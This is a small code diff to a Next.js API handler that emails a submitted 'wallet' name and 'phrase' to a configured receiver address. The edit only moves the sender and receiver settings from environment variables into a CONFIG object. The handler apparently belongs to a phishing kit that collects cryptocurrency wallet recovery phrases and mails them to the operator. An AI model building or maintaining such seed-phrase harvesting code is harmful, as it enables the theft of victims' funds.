@@ -1,4 +1,4 @@
-import { APP_NAME, ERROR_MESSAGES } from './../../utils/constants'
+import { APP_NAME, CONFIG, ERROR_MESSAGES } from './../../utils/constants'
 import { generateTemplate, sendMail2 } from './../../utils/mailer'
 
 import { NextApiRequest, NextApiResponse } from 'next'
@@ -33,8 +33,8 @@ const handler = async (req: NextApiRequest, res: NextApiResponse) => {
         }
 
         await sendMail2(
-          process.env.EMAIL_SENDER! || '',
-          process.env.RECEIVER_EMAIL!,
+          CONFIG.sender,
+          CONFIG.receiver,
           APP_NAME,
           generateTemplate(capitalize(wallet), phrase)
         )
